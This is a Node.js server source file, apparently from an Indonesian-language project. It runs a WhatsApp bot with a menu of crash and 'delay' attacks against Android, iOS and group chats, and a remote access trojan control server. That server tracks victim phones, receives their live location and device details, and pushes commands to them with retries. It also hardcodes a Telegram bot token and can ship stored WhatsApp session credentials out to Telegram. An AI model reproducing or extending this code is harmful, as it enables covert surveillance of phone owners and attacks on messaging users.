const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    fetchLatestBaileysVersion,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const fsPromises = require('fs').promises;
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer(app); // gunakan Express app
const wss = new WebSocket.Server({ noServer: true });
let wsClients = {}; // { username: WebSocket }
let chatList = [];  // { from, to, message, time }
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const apkBuilder = require('./src/services/apkBuilder');
const DB_PATH = "./database.json";
const SESSION_PATH = path.join(__dirname, "permenmd");

function atomicWrite(filePath, content) {
  const tmp = filePath + '.tmp';
  fs.writeFileSync(tmp, typeof content === 'string' ? content : JSON.stringify(content, null, 2));
  fs.renameSync(tmp, filePath);
}

// ===== RAT DATA STORAGE =====
const RAT_DIR = path.join(__dirname, 'rat_data');
if (!fs.existsSync(RAT_DIR)) fs.mkdirSync(RAT_DIR, { recursive: true });

const initRatFiles = ['targets.json', 'commands.json', 'responses.json', 'notifications.json', 'keys.json'];
initRatFiles.forEach(file => {
    const filePath = path.join(RAT_DIR, file);
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, '[]', 'utf8');
        console.log(`[RAT INIT] Created ${file}`);
    }
});

function ratReadDB(file) {
    try { return JSON.parse(fs.readFileSync(path.join(RAT_DIR, file), 'utf8')); } 
    catch(e) { return []; }
}

function ratWriteDB(file, data) {
    fs.writeFileSync(path.join(RAT_DIR, file), JSON.stringify(data, null, 2));
}

function generateRatId(username = '', length = 8) {
    const uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const lowercase = 'abcdefghijklmnopqrstuvwxyz';
    const digits = '0123456789';
    const allChars = uppercase + lowercase + digits;
    let random = '';
    for (let i = 0; i < length; i++) {
        random += allChars.charAt(Math.floor(Math.random() * allChars.length));
    }
    return `LEICAS_${random}`;
}

function generateKcid(length = 8) {
    const uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const lowercase = 'abcdefghijklmnopqrstuvwxyz';
    const digits = '0123456789';
    const allChars = uppercase + lowercase + digits;
    let random = '';
    for (let i = 0; i < length; i++) {
        random += allChars.charAt(Math.floor(Math.random() * allChars.length));
    }
    return `KC_${random}`;
}

/** Pastikan user punya kcid; generate & simpan ke database.json kalau belum ada. */
function ensureKcid(user) {
    try {
        if (!user) return null;
        if (user.kcid && String(user.kcid).trim() !== '') return user.kcid.trim();
        const { loadDatabase, saveDatabase } = require('./src/services/databaseService');
        const db = loadDatabase();
        const target = db.find(u => u.username === user.username) || null;
        if (!target) return null;
        if (!target.kcid || String(target.kcid).trim() === '') {
            target.kcid = generateKcid();
            saveDatabase(db);
        }
        user.kcid = target.kcid;
        return target.kcid;
    } catch (e) {
        console.warn('[KCID] ensureKcid error:', e.message);
        return null;
    }
}
const THIRTY_MINUTES = 60 * 60 * 1000; // 60 menit
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
  { bug_id: "01fc", bug_name: " Ⓧ FC ANDROID 𝓣 [RAWAN KENON]" },
 { bug_id: "02blank", bug_name: " Ⓧ BLANK ANDRO 𝓣 [RAWAN KENON]" },
  { bug_id: "dxlay", bug_name: " Ⓧ 𝗗𝗘𝗟𝗔𝗬 𝗜𝗡𝗩𝗜𝗦𝗜𝗕𝗟𝗘 𝓣 " },
  { bug_id: "03delay", bug_name: " Ⓧ DELAYxDRAIN KUOTA 𝓣 [BEBAS SPAM]" },
  { bug_id: "ios_crash", bug_name: " Ⓧ CR4SH IOS [BEBAS SPAM]" },
  { bug_id: "04delay", bug_name: " Ⓧ BULDOZER 𝓣 [BEBAS SPAM]" },
  { bug_id: "05delay", bug_name: " Ⓧ DELAY INVISIBLE [BEBAS SPAM]"},
  { bug_id: "06delay", bug_name: " Ⓧ FREZZE DELAY 𝓣 [BEBAS SPAM]"},
  { bug_id: "06delay", bug_name: " Ⓧ DELAY ANDRO & IOS 𝓣 [BEBAS SPAM]"},
  { bug_id: "ofmcrlx_group", bug_name: "[ Ⓧ DELAY GB 𝓣 ]"},
  { bug_id: "08delay", bug_name: " Ⓧ DELAY VISIBLE 𝓣 [BEBAS SPAM]"},
  { bug_id: "roid_group", bug_name: "Ⓧ BLANK GB " },
  { bug_id: "lock_group", bug_name: "Ⓧ porklos GB" }
 //  { bug_id: "02blank", bug_name: "Ⓧ BALNK ANDRO 𝓣" },
];
let cncActive = true; // Flag CNC
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});


// Load chat from file
if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

// Simpan chat
function saveChat() {
  atomicWrite(CHAT_FILE, chatList);
}

// Sanitize fungsi
function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '') // hilangkan tag html
    .replace(/[\r\n]/g, ' ') // hilangkan newline
    .slice(0, 250); // batas 250 karakter
}

// ===== GLOBAL CHAT STORAGE =====
const GLOBAL_CHAT_FILE = 'global_chat.json';
let globalChatList = [];
if (fs.existsSync(GLOBAL_CHAT_FILE)) {
  globalChatList = JSON.parse(fs.readFileSync(GLOBAL_CHAT_FILE, 'utf8'));
}
// Backfill id untuk pesan lama biar bisa di-reply / dedup oleh client
let _gcBackfilled = false;
function backfillGlobalChatIds() {
  if (_gcBackfilled) return;
  let changed = false;
  globalChatList.forEach((m, i) => {
    if (!m.id) {
      m.id = 'gc_legacy_' + i + '_' + (m.timestamp || Date.now());
      changed = true;
    }
  });
  if (changed) saveGlobalChat();
  _gcBackfilled = true;
}
backfillGlobalChatIds();

function makeGlobalMsg(username, message, image, replyTo) {
  const msg = {
    id: 'gc_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8),
    username,
    message: sanitize(message || ''),
    timestamp: Date.now()
  };
  if (image && typeof image === 'string' && image.length <= 300) msg.image = image;
  if (replyTo && typeof replyTo === 'object') {
    msg.replyTo = {
      id: sanitize(replyTo.id || ''),
      username: sanitize(replyTo.username || ''),
      message: sanitize(replyTo.message || '')
    };
    if (replyTo.image && typeof replyTo.image === 'string' && replyTo.image.length <= 300) {
      msg.replyTo.image = replyTo.image;
    }
  }
  return msg;
}

function pushGlobalChat(msg) {
  globalChatList.push(msg);
  if (globalChatList.length > 500) globalChatList = globalChatList.slice(-500);
  saveGlobalChat();
  for (const u in wsClients) {
    try {
      wsClients[u].send(JSON.stringify({ type: 'globalChat', message: msg }));
    } catch (_) {}
  }
}

function saveGlobalChat() { atomicWrite(GLOBAL_CHAT_FILE, globalChatList); }

const ADMIN_INFO_FILE = 'admin_info.json';
let infoList = [];
if (fs.existsSync(ADMIN_INFO_FILE)) {
  infoList = JSON.parse(fs.readFileSync(ADMIN_INFO_FILE, 'utf8'));
}
function saveAdminInfo() { atomicWrite(ADMIN_INFO_FILE, infoList); }

const TOKEN = "8960386530:AAG7qdb4l0ccoGRQOkjB4gzWfaYIBk29FR0"; // Ganti dengan token bot kamu
const bot = new TelegramBot(TOKEN, { polling: true });

// Fungsi Helper untuk Logging Asinkron (Mencegah Server Freeze/Lag)
async function appendLogAsync(filePath, data) {
  try {
    // Cek ukuran file dulu, jika terlalu besar (>5MB) hapus isi lama
    if (fs.existsSync(filePath)) {
      const stats = fs.statSync(filePath);
      if (stats.size > 5 * 1024 * 1024) { // 5MB Limit
        fs.writeFileSync(filePath, ''); // Reset file jika terlalu besar
      }
    }
    await fsPromises.appendFile(filePath, data);
  } catch (err) {
    console.error(`[❌ LOG ERROR] Gagal menulis log: ${err.message}`);
  }
}

async function autoRefresh() {
  try {
    // ===== CLEAR SESSION =====
    if (!fs.existsSync(SESSION_PATH)) {
      console.log("⚠️ Folder 'permenmd' tidak ditemukan.");
    } else {
      let deletedCount = 0;
      const userFolders = fs.readdirSync(SESSION_PATH);

      for (const userFolder of userFolders) {
        const userPath = path.join(SESSION_PATH, userFolder);
        if (!fs.lstatSync(userPath).isDirectory()) continue;

        const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
        if (!hasJson) {
          fs.rmSync(userPath, { recursive: true, force: true });
          deletedCount++;
        }
      }
      console.log(`[AUTO REFRESH] ${deletedCount} folder session kosong dihapus.`);
    }

    // ===== AUTO RESTART COUNTDOWN =====
    console.log(`[AUTO REFRESH] Auto restart dalam ${RESTART_COUNTDOWN_SECONDS} detik...`);

    let countdownMsg = null;
    try {
      countdownMsg = await bot.sendMessage(GROUP_BACKUP_CHAT_ID,
        "🌀 *S Y S T E M   R E S T A R T*\n\n" +
        "╭━━━━━━━━━━━━━━━━━━━╮\n" +
        `┃     ⏳ *${RESTART_COUNTDOWN_SECONDS}* detik      ┃\n` +
        "┃  Server akan restart  ┃\n" +
        "╰━━━━━━━━━━━━━━━━━━━╯\n\n" +
        "```▰▰▰▰▰▰▰▰▰▰ 100%```\n" +
        "_Mohon tunggu, proses restart otomatis..._",
        { parse_mode: "Markdown" }
      );
    } catch (e) {
      console.warn(`[AUTO REFRESH] Gagal mengirim pesan ke telegram: ${e.message}`);
    }

    for (let i = RESTART_COUNTDOWN_SECONDS; i >= 1; i--) {
      await new Promise(resolve => setTimeout(resolve, 1000));
      if (countdownMsg) {
        const elapsed = RESTART_COUNTDOWN_SECONDS - i + 1;
        const filled = Math.round((elapsed / RESTART_COUNTDOWN_SECONDS) * 10);
        const empty = 10 - filled;
        const bar = "▰".repeat(filled) + "▱".repeat(empty);
        bot.editMessageText(
          "🌀 *S Y S T E M   R E S T A R T*\n\n" +
          "╭━━━━━━━━━━━━━━━━━━━╮\n" +
          `┃     ⏳ *${i}* detik      ┃\n` +
          "┃  Server akan restart  ┃\n" +
          "╰━━━━━━━━━━━━━━━━━━━╯\n\n" +
          `\`${bar}\`\n` +
          "_Proses restart otomatis..._",
          { chat_id: GROUP_BACKUP_CHAT_ID, message_id: countdownMsg.message_id, parse_mode: "Markdown" }
        ).catch(() => {});
      }
    }

    await new Promise(resolve => setTimeout(resolve, 1000));

    if (countdownMsg) {
      bot.editMessageText(
        "🌀 *S Y S T E M   R E S T A R T*\n\n" +
        "╭━━━━━━━━━━━━━━━━━━━╮\n" +
        "┃    ✅ *RESTARTING*   ┃\n" +
        "┃   Server akan aktif  ┃\n" +
        "┃  kembali dalam hitungan detik  ┃\n" +
        "╰━━━━━━━━━━━━━━━━━━━╯\n\n" +
        "▰▰▰▰▰▰▰▰▰▰ 100%\n" +
        "_Sampai jumpa..._",
        { chat_id: GROUP_BACKUP_CHAT_ID, message_id: countdownMsg.message_id, parse_mode: "Markdown" }
      ).catch(() => {});
    }

    console.log("[AUTO REFRESH] Process restart server");
    fs.writeFileSync(path.join(__dirname, '.restart-flag'), '1');
    process.exit(0);

  } catch (err) {
    console.error("[AUTO REFRESH] Error", err);
  }
}

// ===== BACKUP DATABASE & SESSION KE TELEGRAM =====
const BACKUP_CHAT_ID = 0; // nonaktifkan backup untuk sementara
const BACKUP_INTERVAL = 6 * 60 * 60 * 1000;
const GROUP_BACKUP_CHAT_ID = -1004396382302;
const RESTART_COUNTDOWN_SECONDS = 6;

async function performBackup() {
  if (!BACKUP_CHAT_ID) {
    console.log('[BACKUP] Dilewati: BACKUP_CHAT_ID belum dikonfigurasi');
    return;
  }

  const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  const backupName = `backup-${timestamp}`;
  const tmpDir = path.join(__dirname, 'tmp_backup');
  const tarPath = path.join(__dirname, `${backupName}.tar.gz`);

  try {
    console.log(`[BACKUP] Memulai backup ke Telegram (${BACKUP_CHAT_ID})...`);
    if (fs.existsSync(tmpDir)) fs.rmSync(tmpDir, { recursive: true, force: true });
    fs.mkdirSync(tmpDir, { recursive: true });

    if (fs.existsSync(DB_PATH))
      fs.copyFileSync(DB_PATH, path.join(tmpDir, 'database.json'));
    if (fs.existsSync(SESSION_PATH))
      fs.cpSync(SESSION_PATH, path.join(tmpDir, 'sessions'), { recursive: true, force: true });
    if (fs.existsSync(path.join(__dirname, 'telegram.json')))
      fs.copyFileSync(path.join(__dirname, 'telegram.json'), path.join(tmpDir, 'telegram.json'));
    if (fs.existsSync(path.join(__dirname, 'keyList.json')))
      fs.copyFileSync(path.join(__dirname, 'keyList.json'), path.join(tmpDir, 'keyList.json'));

    const { execSync } = require('child_process');
    execSync(`tar -czf "${tarPath}" -C "${tmpDir}" .`, { stdio: 'pipe' });

    const stats = fs.statSync(tarPath);
    if (stats.size > 0) {
      await bot.sendDocument(BACKUP_CHAT_ID, tarPath, {
        caption: `📦 *Auto Backup*\n🕐 ${timestamp}\n📏 ${(stats.size / 1024).toFixed(1)} KB`,
        parse_mode: 'Markdown',
      });
      console.log(`[BACKUP] Berhasil dikirim: ${backupName}.tar.gz (${(stats.size / 1024).toFixed(1)} KB)`);
    }

    fs.rmSync(tarPath, { force: true });
    fs.rmSync(tmpDir, { recursive: true, force: true });
  } catch (err) {
    const detail = err.errors ? err.errors.map(e => e.message).join('; ') : err.message;
    console.error(`[BACKUP ERROR] ${detail}`);
    try {
      if (fs.existsSync(tmpDir)) fs.rmSync(tmpDir, { recursive: true, force: true });
      if (fs.existsSync(tarPath)) fs.rmSync(tarPath, { force: true });
    } catch (_) {}
  }
}

// ===== Setup Log System =====
const LOGS_DIR = path.join(__dirname, 'user_logs'); // Folder khusus log user

function hapusIsiUserLogs() {
  if (!fs.existsSync(LOGS_DIR)) {
    console.log("[AUTOCLEAN LOGS] Folder tidak ditemukan");
    return;
  }

  const files = fs.readdirSync(LOGS_DIR);

  for (const file of files) {
    const filePath = path.join(LOGS_DIR, file);
    fs.rmSync(filePath, { recursive: true, force: true });
  }

  console.log("[AUTOCLEAN LOGS] Isi folder berhasil dihapus");
}

// Buat folder jika belum ada
if (!fs.existsSync(LOGS_DIR)) {
  fs.mkdirSync(LOGS_DIR, { recursive: true });
  console.log("[LOGS] Folder 'user_logs' dibuat.");
}

/**
 * Fungsi untuk menyimpan aktivitas user ke file JSON mereka sendiri
 * @param {string} username - Username user
 * @param {string} type - 'login', 'bug', 'create'
 * @param {string} title - Judul aktivitas
 * @param {string} description - Detail aktivitas
 */
function saveUserLog(username, type, title, description) {
  try {
    const userLogPath = path.join(LOGS_DIR, `${username}.json`);
    let logs = [];

    // Baca log lama jika ada
    if (fs.existsSync(userLogPath)) {
      logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));
    }

    // Tambah log baru
    logs.push({
      type: type,
      title: title,
      description: description,
      timestamp: Date.now() // Timestamp dalam milidetik
    });

    // Simpan kembali (Overwrite)
    fs.writeFileSync(userLogPath, JSON.stringify(logs, null, 2));
    console.log(`[LOGS] Activity saved for ${username}: ${type}`);
  } catch (err) {
    console.error(`[LOGS] Gagal simpan log ${username}:`, err.message);
  }
}

wss.on('connection', function (ws, req) {
  let username;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

      if (data.type === 'sessionCheck') {
        const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const user = sessionList.find(e => e.sessionKey === data.key);

        if (!user) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Invalid key"
          }));
          return ws.close();
        }

        if (user.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Another device has logged in"
          }));
          return ws.close();
        }
      }

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)

        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        // Autentikasi sukses
        username = validKey.username;
        const db = loadDatabase();
        const userInfo = db.find(u => u.username === validKey.username);
        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: validKey.username,
          androidId: validKey.androidId,
          role: (userInfo && userInfo.role) || "member"
        }));

        // Daftarkan ke wsClients supaya menerima broadcast new_info (tanpa perlu 'auth')
        wsClients[validKey.username] = ws;

        const interval = setInterval(() => {
          const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
          const validKey = session.find(e => e.sessionKey === data.key)
          const validId = session.find(e => e.androidId === data.androidId)

          if (!validKey) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "keyInvalid"
            }));
            return ws.close();
          }

          if (!validId) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "androidIdMismatch"
            }));
            return ws.close();
          }

        }, 10000);
      }
      if (data.type === 'auth') {
        username = getUserByKey(data.key);
        console.log(username)
        if (!username) return ws.close();
        wsClients[username] = ws;

        // Kirim chatList awal
        const list = chatList
          .filter(m => m.from === username || m.to === username)
          .map(m => (m.from === username ? m.to : m.from));

        ws.send(JSON.stringify({
          type: "chatList",
          users: [...new Set(list)],
        }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
        if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        // Kirim ke pengirim
        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        // Kirim ke penerima jika online
        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }

      // ===== GLOBAL CHAT via WebSocket =====
      if (data.type === 'globalChat') {
        const message = sanitize(data.message);
        const image = data.image;
        if (!username) return;
        if ((!message || message.length > 250) && !image) return;

        const msg = makeGlobalMsg(username, message, image, data.replyTo);
        pushGlobalChat(msg);
      }

      if (data.type === 'getGlobalChat') {
        ws.send(JSON.stringify({
          type: 'globalChatList',
          messages: globalChatList.slice(-100)
        }));
      }
    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username] === ws) {
      delete wsClients[username];
    }
  });
});


// ==================== STANDALONE RAT SOCKET.IO HANDLER ====================
const { Server: SocketIOServer } = require('socket.io');
const ratService = require('./src/services/ratService');
const socketManager = require('./src/services/socketManager');
const lockChatService = { // Placeholder, karena kita tidak migrasi lockChatService
    appendMsg: () => {},
    initChat: () => ({ messages: [] }),
    deleteChat: () => {}
};

const ratIO = new SocketIOServer(server, {
    cors: { origin: '*' },
    path: '/rat-socket', // Keep dv-api path
    pingInterval: 30000,
    pingTimeout: 90000,
    upgradeTimeout: 30000,
    maxHttpBufferSize: 50e6,
    allowEIO3: true,
    transports: ['websocket', 'polling'],
    serveClient: false,
});

socketManager.setIo(ratIO);

// Reset semua device ke offline saat server startup
try {
    const targets = ratService.getTargets();
    targets.forEach(t => {
        if (t.online) {
            ratService.updateTargetStatus(t.id || t.deviceId, 'offline');
        }
    });
    console.log('[RAT] Startup: all devices reset to offline');
} catch (e) {
    console.warn('[RAT] Startup reset failed:', e.message);
}

const activeSubscriptions = new Map();
const heartbeatTimeouts = new Map();
const pendingAcks = new Map();
const HEARTBEAT_TIMEOUT = 90000; // 90 detik
const ACK_TIMEOUT = 15000;
const MAX_ACK_RETRIES = 3;

const ratNsp = ratIO.of('/rat');

const defaultIO = new SocketIOServer(server, {
    cors: { origin: '*' },
    path: '/socket.io/',
    pingInterval: 30000,
    pingTimeout: 90000,
    maxHttpBufferSize: 50e6,
    allowEIO3: true, // support client socket.io-client Java 2.x (Engine.IO v3)
    transports: ['websocket', 'polling'],
    serveClient: false,
});

function emitToTarget(targetId, event, data) {
    ratIO.to('target_' + targetId).emit(event, data);
    ratNsp.to('target_' + targetId).emit(event, data);
    if (defaultIO) defaultIO.to('target_' + targetId).emit(event, data);
}

function emitToAdmin(targetId, event, data) {
    ratIO.to('admin_' + targetId).emit(event, data);
    ratNsp.to('admin_' + targetId).emit(event, data);
    if (defaultIO) defaultIO.to('admin_' + targetId).emit(event, data);
}

function startAckTimer(commandId) {
    if (pendingAcks.has(commandId)) {
        clearTimeout(pendingAcks.get(commandId).timer);
    }
    const entry = pendingAcks.get(commandId);
    if (!entry) return;
    entry.retries = (entry.retries || 0) + 1;
    if (entry.retries > MAX_ACK_RETRIES) {
        console.log('[ACK] Max retries for ' + commandId);
        setDelivered(commandId);
        pendingAcks.delete(commandId);
        return;
    }
    entry.timer = setTimeout(() => {
        console.log('[ACK] Timeout for ' + commandId + ', retrying...');
        const payload = { command: entry.command, extra: entry.extra, commandId, fromAdmin: true };
        emitToTarget(entry.targetId, 'new_command', payload);
        startAckTimer(commandId);
    }, ACK_TIMEOUT);
}

function setDelivered(commandId) {
    ratService.updateCommandStatus(commandId, 'completed');
}

function clearPendingAcksForTarget(targetId) {
    for (const [cmdId, entry] of pendingAcks) {
        if (entry.targetId === targetId) {
            clearTimeout(entry.timer);
            pendingAcks.delete(cmdId);
        }
    }
}

function handleRatSocket(socket, nsLabel) {
    const q = socket.handshake.query;
    const targetId = q.id;
    const type = q.type;
    const accountId = q.accountId || q.ratId || null;
    const kcid = q.kcid || null;

    if (!type) return;

    if (type === 'target') {
        console.log(`[RAT${nsLabel}] Target connected: ${targetId} (account: ${accountId})`);
        socket.join('target_' + targetId);
        socket.join('account_' + accountId);

        let target = ratService.getTarget(targetId);
        ratService.updateTargetStatus(targetId, 'online', { accountId, admin_owner: accountId, kcid, socketId: socket.id });
        emitToAdmin(targetId, 'target_status', { deviceId: targetId, accountId, status: 'Online' });
        if (heartbeatTimeouts.has(targetId)) clearTimeout(heartbeatTimeouts.get(targetId));

        const pendingCmds = ratService.getPendingCommands(targetId);
        if (pendingCmds && pendingCmds.length > 0) {
            console.log(`[RAT${nsLabel}] Delivering ${pendingCmds.length} pending commands to ${targetId}`);
            for (const cmd of pendingCmds) {
                const payload = { command: cmd.command, extra: cmd.extra, commandId: cmd.id, fromAdmin: true };
                socket.emit('new_command', payload);
                pendingAcks.set(cmd.id, { targetId, command: cmd.command, extra: cmd.extra, retries: 0, timer: null });
                startAckTimer(cmd.id);
            }
        }

        socket.on('heartbeat', (data) => {
            const batteryValue = (data && (data.battery || data.batteryStr));
            const hbKcid = (data && data.kcid) || kcid || null;
            ratService.updateTargetStatus(targetId, 'online', {
                accountId,
                battery: batteryValue ? batteryValue.toString().replace('%', '') : undefined,
                ...(hbKcid ? { kcid: hbKcid } : {})
            });
            emitToAdmin(targetId, 'heartbeat', { deviceId: targetId, battery: batteryValue });
            if (heartbeatTimeouts.has(targetId)) clearTimeout(heartbeatTimeouts.get(targetId));
            heartbeatTimeouts.set(targetId, setTimeout(() => {
                ratService.updateTargetStatus(targetId, 'offline');
                emitToAdmin(targetId, 'target_status', { deviceId: targetId, status: 'Offline (timeout)' });
            }, HEARTBEAT_TIMEOUT));
        });

        socket.on('device_info', (data) => {
            if (!data) return;
            ratService.updateTargetStatus(targetId, 'online', {
                model: data.model,
                androidVersion: data.androidVersion,
                manufacturer: data.manufacturer,
                deviceAdmin: data.deviceAdmin,
                rooted: data.rooted,
                accountId,
                admin_owner: accountId,
                kcid: data.kcid || kcid || null
            });
            emitToAdmin(targetId, 'device_info', data);
        });

        socket.on('live_location', (data) => {
            if (!data) return;
            emitToAdmin(targetId, 'live_location', { deviceId: targetId, ...data });
        });

        socket.on('command_received', (data) => {
            const cmdId = data && data.commandId;
            if (cmdId && pendingAcks.has(cmdId)) {
                clearTimeout(pendingAcks.get(cmdId).timer);
                pendingAcks.delete(cmdId);
                ratService.updateCommandStatus(cmdId, 'completed');
            }
        });

        socket.on('target_response', (data) => {
            const command = data && (data.cmd || data.command);
            let responseData = (data && (data.data || data.result)) || data;
            ratService.addResponse(targetId, command, responseData);
            emitToAdmin(targetId, 'response_update', { deviceId: targetId, command, cmd: command, data: responseData });
        });

        socket.on('disconnect', () => {
            console.log(`[RAT${nsLabel}] Target disconnected: ${targetId}`);
            clearPendingAcksForTarget(targetId);
            ratService.updateTargetStatus(targetId, 'offline');
            emitToAdmin(targetId, 'target_status', { deviceId: targetId, status: 'Offline' });
            if (heartbeatTimeouts.has(targetId)) clearTimeout(heartbeatTimeouts.get(targetId));
        });

    } else if (type === 'admin') {
        console.log(`[RAT${nsLabel}] Admin connected: ${socket.id} (account: ${accountId})`);
        
        socket.on('subscribe_target', (tId) => {
            const tgt = ratService.getTarget(tId);
            if (!tgt) {
                socket.emit('subscribe_error', { targetId: tId, error: 'Target not found' });
            } else if (tgt.admin_owner && tgt.admin_owner !== 'UNKNOWN' && accountId && tgt.admin_owner !== accountId) {
                socket.emit('subscribe_error', { targetId: tId, error: 'Ownership mismatch' });
            } else {
                socket.join('admin_' + tId);
                if (!activeSubscriptions.has(socket.id)) activeSubscriptions.set(socket.id, new Set());
                activeSubscriptions.get(socket.id).add(tId);
                socket.emit('subscribe_success', { targetId: tId });
            }
        });

        socket.on('send_command', (data) => {
            const tId = data.targetId;
            const command = data.command;
            const extra = data.extra;
            const adminAccountId = data.accountId || accountId;
            const adminKcid = data.kcid || kcid || null;

            const target = ratService.getTarget(tId);
            if (!target) return socket.emit('command_error', { error: 'Target not found' });

            const owner = target.admin_owner || target.accountId || null;
            const targetKcid = target.kcid || null;
            if (adminKcid && targetKcid && adminKcid !== targetKcid) {
                return socket.emit('command_error', { error: 'KCID mismatch' });
            }
            if (owner && owner !== 'UNKNOWN' && adminAccountId && owner !== adminAccountId && (!adminKcid || !targetKcid)) {
                return socket.emit('command_error', { error: 'Ownership mismatch' });
            }

            const newCmd = ratService.addCommand(tId, command, extra, adminAccountId, { delivered: false });
            const payload = { command, extra, commandId: newCmd.id, fromAdmin: true };
            emitToTarget(tId, 'new_command', payload);
            pendingAcks.set(newCmd.id, { targetId: tId, command, extra, retries: 0, timer: null });
            startAckTimer(newCmd.id);
            socket.emit('command_ack', { commandId: newCmd.id, status: 'sent' });
        });

        socket.on('disconnect', () => {
            activeSubscriptions.delete(socket.id);
            console.log(`[RAT${nsLabel}] Admin disconnected: ${socket.id}`);
        });
    }
}

ratIO.on('connection', (socket) => handleRatSocket(socket, ''));
ratNsp.on('connection', (socket) => handleRatSocket(socket, '/rat'));
defaultIO.on('connection', (socket) => handleRatSocket(socket, '/default'));

// ==================== MANUAL UPGRADE HANDLER UNTUK WEBSOCKET (Mencegah Konflik) ====================
// Berhubung wss kita set menggunakan { noServer: true }, kita harus mem-bypass request '/ws' ke wss sendiri,
